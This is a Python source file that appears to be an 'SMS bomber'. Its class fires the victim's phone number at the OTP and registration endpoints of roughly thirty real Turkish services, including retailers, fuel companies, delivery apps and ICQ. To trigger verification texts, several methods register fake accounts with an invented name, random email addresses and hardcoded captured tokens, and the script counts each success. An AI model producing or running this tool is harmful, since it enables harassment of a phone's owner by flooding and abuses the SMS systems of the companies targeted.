import requests
from random import choice
from string import ascii_lowercase
from bs4 import BeautifulSoup
from colorama import Fore, Style

class SendSms():
    random_mail = ''.join(choice(ascii_lowercase) for i in range(20))
    adet = 0
    
    def __init__(self, phone):
        self.phone = phone


    # dsmartgo.com.tr
    def Dsmartgo(self):    
        dsmartgo = requests.post("https://www.dsmartgo.com.tr/web/account/checkphonenumber", data={
        	"__RequestVerificationToken": "bYFLKS9DehCBAb7l7KaI2WoTdtAJZya-AWsDTmHCl9FnEaUZiF2F1l3XkwppUyT0I3bXMUdUAruBUcqR8jVuLVsxPC41",
        	"IsSubscriber": "true",
        	"__reCAPTCHAVerificationToken": "03AGdBq26zV1jYt3RM1kdow0gpFcD7veljQAdV-0QoKLQIWi3voe27TlOwjbktguXtHgngHy13jsTzudfoNuLowIdqG1RcX4_XP5VoXy4un214kmTqChIDJPMKWvkUmLfXvWvXNTdajueI0T4zkdX2VGLz1Vn-uQxRRWxXjY81GZQlLUqu3oOSDYLBN2JH5DPh79Ms4BAxrTFC-ywWIWN1VVN5R2S6R6Ew7iyhDN_QQ1Ow5XcKuT7ycZbMrC_GUML5sKeDgoOtvm4pZ75LKX8ZArd9EPM783h0AXXVMedFGxa0V7a6_FocQ_7PRHeyOnku-HyoMgGZgB7cSIu6tPNddtYGLbOMGhR-2EyCtW4qKq1a9yceT-v7nequ9S0Cr-gYhb7DkjUyk56oUaZD6Za2NzqxIHPzfWC2M9x8WWeiWFqGSCHhjtL29UzGV8HH38X85BEpJKUVc_1U",
        	"Mobile": self.phone,
        }, cookies={
        		"__RequestVerificationToken": "zavKdfCRqVPRUTX-52rcfG8yfGNVfs10gNOb5RIn16upRTctGH4nBp8ReSMxzZUN4cJQTcvY0b4uzP6AL0inDD_cFyA1",
        		"_ga": "GA1.3.1016548678.1638216163",
        		"_gat": "1",
        		"_gat_gtag_UA_18913632_14": "1",
        		"_gid": "GA1.3.1214889554.1638216163",
        		"ai_session": "lsdsMzMdX841eBwaKMxd8e|1638216163472|1638216163472",
        		"ai_user": "U+ClfGV5d2ZK1W1o19UNDn|2021-11-29T20:02:43.148Z"
        	})
        try:
            BeautifulSoup(dsmartgo.text, "html.parser").find("div", {"class": "info-text"}).text.strip()
            print(f"{Fore.LIGHTRED_EX}[  RET ] {Style.RESET_ALL}hata >>> dsmartgo")
        except AttributeError:
            print(f"{Fore.LIGHTGREEN_EX}[  ONAY ] {Style.RESET_ALL}gönderildi >>> dsmartgo")
            self.adet += 1


    #kahvedunyasi.com
    def KahveDunyasi(self):    
        try:    
            kahve_dunyasi = requests.post("https://core.kahvedunyasi.com/api/users/sms/send", data={
                "mobile_number": self.phone,
                "token_type": "register_token"
            })
            if len(kahve_dunyasi.json()["meta"]["messages"]["error"]) == 0:
                print(f"{Fore.LIGHTGREEN_EX}[  ONAY ] {Style.RESET_ALL}gönderildi >>> kahvedunyasi")
                self.adet += 1
            else:
                raise
        except:    
            print(f"{Fore.LIGHTRED_EX}[  RET ] {Style.RESET_ALL}hata >>> kahvedunyasİ")
        
 
    #podyumplus.com
    def PodyumPlus(self):    
        try:
            url = f"https://www.podyumplus.com:443/index.php?route=account/account/control&telephone={self.phone}"
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "X-Requested-With": "XMLHttpRequest", "Dnt": "1", "Referer": "https://www.podyumplus.com/giris-yap", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
            r = requests.get(url, headers=headers)
            if (r.json()["success"]) == True:
                print(f"{Fore.LIGHTGREEN_EX}[  ONAY ] {Style.RESET_ALL}gönderildi >>> podyumplus")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[  RET ] {Style.RESET_ALL}hata >>> podyumplus")
        

    #naosstars.com
    def NaosStars(self):
        try:
            naosstars = requests.post("https://shop.naosstars.com/users/register/", data={
                "email": f"{self.random_mail}@gmail.com",
                "first_name": "Memati",
                "last_name": "Bas",
                "password": "31ABC..abc31",
                "date_of_birth": "1975-12-31",
                "phone": f"0{self.phone}",
                "gender": "male",
                "kvkk": "true",
                "contact": "true",
                "confirm": "true"
            })
            if naosstars.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[  ONAY ] {Style.RESET_ALL}gönderildi >>> naosstars")
                self.adet += 1 
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[  RET ] {Style.RESET_ALL}hata >>> naosstars")

            
    #bim
    def Bim(self):
        try:
            bim = requests.post("https://bim.veesk.net:443/service/v1.0/account/login",  json={"phone": self.phone})
            if bim.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[  ONAY ] {Style.RESET_ALL}gönderildi >>> bim")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[  RET ] {Style.RESET_ALL}hata >>> bim")
            
        
    #ceptesok.com
    def Sok(self):
        try:
            r = requests.post("https://api.ceptesok.com:443/api/users/sendsms",  json={"mobile_number": self.phone, "token_type": "register_token"})
            if len(r.json()["meta"]["messages"]["success"]) != 0:
                print(f"{Fore.LIGHTGREEN_EX}[  ONAY ] {Style.RESET_ALL}gönderildi >>> ceptesok")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[  RET ] {Style.RESET_ALL}hata >>> ceptesok")
            
    
    #tiklagelsin.com
    def Tiklagelsin(self):
        try:
            json={"operationName": "GENERATE_OTP", 
                        "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n", 
                        "variables": {"challenge": "f2523023-283e-46be-b8db-c08f27d3e21c", 
                                    "deviceUniqueId": "3D7C1B44-7F5D-44FC-B3F2-A1024B3AF6D3", 
                                    "phone": self.phone
                                    }
                        }
            tiklagelsin = requests.post("https://svc.apps.tiklagelsin.com:443/user/graphql", json=json)
            if tiklagelsin.json()["data"]["generateOtp"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[  ONAY ] {Style.RESET_ALL}gönderildi >>> tiklagelsin")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[  RET ] {Style.RESET_ALL}hata >>> tiklagelsin")
            
    
    #migros.com.tr
    def Migros(self):
        try:
            migros = requests.post("https://rest.sanalmarket.com.tr:443/sanalmarket/users/login/otp",  json={"phoneNumber": self.phone})
            if migros.json()["successful"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[  ONAY ] {Style.RESET_ALL}gönderildi >>> sanalmarket")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[  RET ] {Style.RESET_ALL}hata >>> sanalmarket")
            
    
    #a101.com.tr
    def A101(self):
        try:
            url = "https://www.a101.com.tr:443/users/otp-login/"
            data = {"phone": f"0{self.phone}", "next": "/a101-kapida"}
            r = requests.post(url,data=data)
            if (r.status_code) == 200:
                print(f"{Fore.LIGHTGREEN_EX}[  ONAY ] {Style.RESET_ALL}gönderildi >>> a101")
                self.adet += 1
            else:
                raise 
        except:
            print(f"{Fore.LIGHTRED_EX}[  RET ] {Style.RESET_ALL}hata >>> a101")


    #englishhome.com
    def Englishhome(self):
        try:
            data = {"first_name": "Memati", "last_name": "Bas", "email": f"{self.random_mail}@gmail.com", "phone": f"0{self.phone}", "password": "31ABC..abc31", "email_allowed": "true", "sms_allowed": "true", "confirm": "true", "tom_pay_allowed": "true"}
            home = requests.post("https://www.englishhome.com:443/enh_app/users/registration/", data=data)
            if home.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[  ONAY ] {Style.RESET_ALL}gönderildi >>> englishhome")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[  RET ] {Style.RESET_ALL}hata >>> englishhome")
            
            
    #sakasu.com.tr
    def Sakasu(self):
        try:
            data = {"phone": self.phone}
            su = requests.post("https://www.sakasu.com.tr:443/app/api_register/step1", data=data)
            if su.json()["status"] == "ok":
                print(f"{Fore.LIGHTGREEN_EX}[  ONAY ] {Style.RESET_ALL}gönderildi >>> sakasu")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[  RET ] {Style.RESET_ALL}hata >>> sakasu")
            
    
    #rentiva.com
    def Rentiva(self): 
        try:
            url = "https://rentiva.com:443/api/Account/Login"
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Content-Type": "application/json"}
            json={"phone": self.phone, "phonePeriod": "never"}
            rentiva = requests.post(url, headers=headers, json=json)
            if rentiva.json()["success"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[  ONAY ] {Style.RESET_ALL}gönderildi >>> rentiva")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[  RET ] {Style.RESET_ALL}hata >>> rentiva")

    
    #dgnonline.com
    def Dgn(self):
        try:
            url = "https://odeme.dgnonline.com:443/index.php?route=ajax/smsconfirm&type=send&ajax=1"
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0", "Accept": "*/*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://odeme.dgnonline.com", "Dnt": "1", "Referer": "https://odeme.dgnonline.com/?bd=1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
            data = {"loginIdentityNumber": "00000000000", "loginMobileNumber": self.phone}
            dgn = requests.post(url, headers=headers, data=data)
            if dgn.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[  ONAY ] {Style.RESET_ALL}gönderildi >>> dgnonline")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[  RET ] {Style.RESET_ALL}hata >>> dgnonline")  
            
    
    #yaanimail.com
    def Yaani(self):
        try:
            url = "https://api.yaanimail.com:443/gateway/v1/accounts/verification-code/send"
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Content-Type": "application/json"}
            json={"action": "create", "email": f"{self.random_mail}@yaani.com", "language": "tr", "recovery_options": [{"type": "email", "value": "a@gmail.com"}, {"type": "msisdn", "value": f"90{self.phone}"}]}
            r = requests.post(url, headers=headers, json=json)
            if r.status_code == 204:
                print(f"{Fore.LIGHTGREEN_EX}[  ONAY ] {Style.RESET_ALL}gönderildi >>> yaanimail")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[  RET ] {Style.RESET_ALL}hata >>> yaanimail")  
            
             
    #defacto.com.tr
    def Defacto(self):
        try:
            url = "https://www.defacto.com.tr:443/Customer/SendPhoneConfirmationSms"
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Accept": "*/*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Referer": "https://www.defacto.com.tr/Login?newUser=True&ReturnUrl=%2FCustomer%2FSendPhoneConfirmationSms", "Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.defacto.com.tr", "Dnt": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
            data = {"mobilePhone": self.phone}
            r = requests.post(url, headers=headers, data=data)
            if r.json()["Data"]["IsSMSSend"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[  ONAY ] {Style.RESET_ALL}gönderildi >>> defacto")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[  RET ] {Style.RESET_ALL}hata >>> defacto")
    
    
    #mopas.com.tr
    def Mopas(self):
        try:
            r = requests.get(f"https://mopas.com.tr/sms/activation?mobileNumber={self.phone}&pwd=&checkPwd=")
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[  ONAY ] {Style.RESET_ALL}gönderildi >>> mopas")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[  RET ] {Style.RESET_ALL}hata >>> mopas")
            
    
    #icq.net
    def Icq(self):
        try:
            url = "https://u.icq.net:443/api/v92/rapi/auth/sendCode"
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Accept": "*/*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/json", "Origin": "https://web.icq.com", "Dnt": "1", "Referer": "https://web.icq.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "cross-site", "Te": "trailers"}
            json={"params": {"application": "icq", "devId": "ic1rtwz1s1Hj1O0r", "language": "en-US", "phone": f"90{self.phone}", "route": "sms"}, "reqId": "25299-1669396271"}
            r = requests.post(url, headers=headers, json=json)
            if r.json()["status"]["code"] == 20000:
                print(f"{Fore.LIGHTGREEN_EX}[  ONAY ] {Style.RESET_ALL}gönderildi >>> icq")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[  RET ] {Style.RESET_ALL}hata >>> icq")
            
    
    #boyner.com
    def Boyner(self):
        try:
            url = "https://www.boyner.com.tr:443/v2/customerV2/Register"
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Accept": "application/json, text/plain, */*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Referer": "https://www.boyner.com.tr/uyelik?type=uye-ol", "X-Newrelic-Id": "Vg8GVlZWCBACUFVRAwkEUFY=", "Newrelic": "eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjI5MTcwNTAiLCJhcCI6IjMyMjUzNjA4MiIsImlkIjoiODE3YTIyZTZhODQ0OTJlNCIsInRyIjoiMTM0MWRkZThjZWVmMTExMjQ3MGE4NDQ2M2I1YWU4NzgiLCJ0aSI6MTY3MDU1MzA1OTMzNn19", "Traceparent": "00-1341dde8ceef1112470a84463b5ae878-817a22e6a84492e4-01", "Tracestate": "2917050@nr=0-1-2917050-322536082-817a22e6a84492e4----1670553059336", "Content-Type": "application/json;charset=utf-8", "Origin": "https://www.boyner.com.tr", "Dnt": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
            json={"Captcha": "", "CaptchaTurn": False, "ConfirmNewPassword": "31ABC..abc31", "isGuestQuickBuy": "false", "Main": {"CellPhone": self.phone, "day": "31", "Email": self.random_mail+"@gmail.com", "FirstName": "Memati", "genderid": "1", "LastName": "Baş", "month": "12", "ReceiveCampaignMessages": True, "year": 1972}, "MembershipAgreement": True, "MembershipAgreementClone": True, "NewPassword": "31ABC..abc31", "ReturnUrl": "/"}
            r = requests.post(url, headers=headers, json=json)
            if r.json()["Success"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[  ONAY ] {Style.RESET_ALL}gönderildi >>> boyner")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[  RET ] {Style.RESET_ALL}hata >>> boyner")
            

    #watsons.com.tr
    def Watsons(self):
        try:
            url = "https://www.watsons.com.tr:443/api/v2/wtctr/phone-verification/phonenumber?lang=tr_TR"
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0", "Accept": "application/json", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Referer": "https://www.watsons.com.tr/register", "Content-Type": "application/json;charset=UTF-8", "X-Dtpc": "11$208941126_619h150vEGITDHTLQJAGKPKRHUIMTILDMPAWJTOL-0e0", "Origin": "https://www.watsons.com.tr", "Dnt": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Pragma": "no-cache", "Cache-Control": "no-cache", "Te": "trailers"}
            json={"countryCode": "TR", "phoneNumber": self.phone}
            r = requests.post(url, headers=headers, json=json)
            if r.status_code == 201:
                print(f"{Fore.LIGHTGREEN_EX}[  ONAY ] {Style.RESET_ALL}gönderildi >>> watsons")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[  RET ] {Style.RESET_ALL}hata >>> watsons")
            
    
    #buyursungelsin.com
    def Buyur(self):
        try:
            url = "https://app.buyursungelsin.com:443/api/customer/form/check"
            headers = {"Accept": "*/*", "Content-Type": "multipart/form-data; boundary=m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M", "Accept-Encoding": "gzip, deflate", "Authorization": "Basic Z2Vsc2luYXBwOjR1N3ghQSVEKkctS2FOZFJnVWtYcDJzNXY4eS9CP0UoSCtNYlFlU2hWbVlxM3Q2dzl6JEMmRilKQE5jUmZValduWnI0dTd4IUElRCpHLUthUGRTZ1ZrWXAyczV2OHkvQj9FKEgrTWJRZVRoV21acTR0Nnc5eiRDJkYpSkBOY1Jm", "User-Agent": "Gelsinapp/30 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr-TR,tr;q=0.9"}
            data = f"--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M\r\ncontent-disposition: form-data; name=\"fonksiyon\"\r\n\r\ncustomer/form/check\r\n--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M\r\ncontent-disposition: form-data; name=\"method\"\r\n\r\nPOST\r\n--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M\r\ncontent-disposition: form-data; name=\"telephone\"\r\n\r\n{self.phone}\r\n--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M--\r\n"
            r = requests.post(url, headers=headers, data=data)
            if (r.status_code) == 200:
                print(f"{Fore.LIGHTGREEN_EX}[  ONAY ] {Style.RESET_ALL}gönderildi >>> buyursungelsin")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[  RET ] {Style.RESET_ALL}hata >>> buyursungelsin")
            
    
    #idealdata.com.tr
    def Osmanlideal(self):
        try:
            r = requests.get(f"https://osmgck.idealdata.com.tr:7850/X%02REQ_SMSDEMO%02{self.random_mail}@gmail.com%020{self.phone}")
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[  ONAY ] {Style.RESET_ALL}gönderildi >>> idealdata")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[  RET ] {Style.RESET_ALL}hata >>> idealdata")
            
    
    
    #suiste.com
    def Suiste(self):
        try:
            url = "https://suiste.com:443/api/auth/code"
            headers = {"Accept": "application/json", "Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "User-Agent": "suiste/1.5.10 (com.mobillium.suiste; build:1228; iOS 15.6.1) Alamofire/5.6.2", "Accept-Language": "tr", "Accept-Encoding": "gzip, deflate"}
            data = {"action": "register", "gsm": self.phone}
            r = requests.post(url, headers=headers, data=data)
            if r.json()["code"] == "common.success":
                print(f"{Fore.LIGHTGREEN_EX}[  ONAY ] {Style.RESET_ALL}gönderildi >>> suiste")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[  RET ] {Style.RESET_ALL}hata >>> suiste")
              

    #ikinciyeni.com
    def IkinciYeni(self):
        try:
            url = "https://apigw.ikinciyeni.com:443/RegisterRequest"
            json={"accounttype": 1, "email": f"{self.random_mail}@gmail.com", "isAddPermission": True, "lastName": "Bas", "name": "Memati", "phone": self.phone}
            r = requests.post(url, json=json)
            if (r.json()["isSucceed"]) == True:
                print(f"{Fore.LIGHTGREEN_EX}[  ONAY ] {Style.RESET_ALL}gönderildi >>> ikinciyeni")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[  RET ] {Style.RESET_ALL}hata >>> ikinciyeni")
        
            
        
 
            
    #mogazmobilapinew.aygaz.com.tr
    def Mogaz(self):
        try:
            url = "https://mogazmobilapinew.aygaz.com.tr:443/api/Member/UserRegister"
            json={"address": "", "birthDate": "31-08-1975", "city": 0, "deviceCode": "839C5FAF-A7C1-2CDA--6F5414AD2228", "district": 0, "email": f"{self.random_mail}@gmail.com", "isUserAgreement": True, "name": "Memati", "password": "", "phone": self.phone, "productType": 1, "subscription": True, "surname": "Bas"}
            r = requests.post(url, json=json)
            if (r.json()["messageCode"]) == "OK":
                print(f"{Fore.LIGHTGREEN_EX}[  ONAY ] {Style.RESET_ALL}gönderildi >>> aygaz")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[  RET ] {Style.RESET_ALL}hata >>> aygaz")
            
            
    #ipragaz.com.tr
    def GoMobile(self):
        try:
            r = requests.get(f"https://gomobilapp.ipragaz.com.tr:443/api/v1/0/authentication/sms/send?phone={self.phone}&isRegistered=true")
            if (r.json()["data"]["success"]) == True:
                print(f"{Fore.LIGHTGREEN_EX}[  ONAY ] {Style.RESET_ALL}gönderildi >>> ipragaz")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[  RET ] {Style.RESET_ALL}hata >>> ipragaz")
            
    
    #petrolofisi.com.tr
    def PetrolOfisi(self):
        try:
            url = "https://mobilapi.petrolofisi.com.tr:443/api/auth/register"
            headers = {"Accept": "*/*", "Content-Type": "application/json", "User-Agent": "Petrol%20Ofisi/78 CFNetwork/1335.0.3 Darwin/21.6.0", "X-Channel": "IOS", "Accept-Language": "tr", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
            json={"approvedContractVersion": "v1", "approvedKvkkVersion": "v1", "contractPermission": True, "deviceId": "", "etkContactPermission": True, "kvkkPermission": True, "mobilePhone": f"0{self.phone}", "name": "Memati", "plate": "31ABC31", "positiveCard": "", "referenceCode": "", "surname": "Bas"}
            r = requests.post(url, headers=headers, json=json)
            if r.status_code == 204:
                print(f"{Fore.LIGHTGREEN_EX}[  ONAY ] {Style.RESET_ALL}gönderildi >>> petrolofisi")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[  RET ] {Style.RESET_ALL}hata >>> petrolofisi")

                    
    #opet.com.tr
    def Opet(self):
        try:
            url = "https://api.opet.com.tr:443/api/authentication/register"
            json={"abroadcompanies": ["1", "2", "3"], "birthdate": "1975-08-31T22:00:00.000Z", "cardNo": None, "commencisRadio": "true", "email": f"{self.random_mail}@gmail.com", "firstName": "Memati", "googleRadio": "true", "lastName": "Bas", "microsoftRadio": "true", "mobilePhone": str(self.phone), "opetKvkkAndEtk": True, "plate": "31ABC31"}
            r = requests.post(url, json=json)
            if (r.status_code) == 200:
                print(f"{Fore.LIGHTGREEN_EX}[  ONAY ] {Style.RESET_ALL}gönderildi >>> opet")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[  RET ] {Style.RESET_ALL}hata >>> opet")
            
    
    #n11.com
    def N11(self):
        try:
            url = "https://mobileapi.n11.com:443/mobileapi/rest/v2/msisdn-verification/init-verification?__hapc=F41A0C01-D102-4DBE-97B2-07BCE2317CD3"
            headers = {"Mobileclient": "IOS", "Content-Type": "application/json", "Accept": "*/*", "Authorization": "api_key=iphone,api_hash=9f55d44e2aa28322cf84b5816bb20461,api_random=686A1491-041F-4138-865F-9E76BC60367F", "Clientversion": "163", "Accept-Encoding": "gzip, deflate", "User-Agent": "n11/1 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr-TR,tr;q=0.9", "Connection": "close"}
            json={"__hapc": "", "_deviceId": "696B171-031N-4131-315F-9A76BF60368F", "channel": "MOBILE_IOS", "countryCode": "+90", "email": F"{self.random_mail}@gmail.com", "gsmNumber": self.phone, "userType": "BUYER"}
            r = requests.post(url, headers=headers, json=json)
            if (r.json()["isSuccess"]) == True:
                print(f"{Fore.LIGHTGREEN_EX}[  ONAY ] {Style.RESET_ALL}gönderildi >>> n11")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[  RET ] {Style.RESET_ALL}hata >>> n11")
            
    
    #joker.com.tr
    def Joker(self):
        try:
            url = "https://www.joker.com.tr:443/kullanici/ajax/check-sms"
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest"}
            data = {"phone": self.phone}
            r = requests.post(url, headers=headers, data=data)
            if (r.json()["success"]) == True:
                print(f"{Fore.LIGHTGREEN_EX}[  ONAY ] {Style.RESET_ALL}gönderildi >>> joker")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX} {Style.RESET_ALL}hata >>> joker")
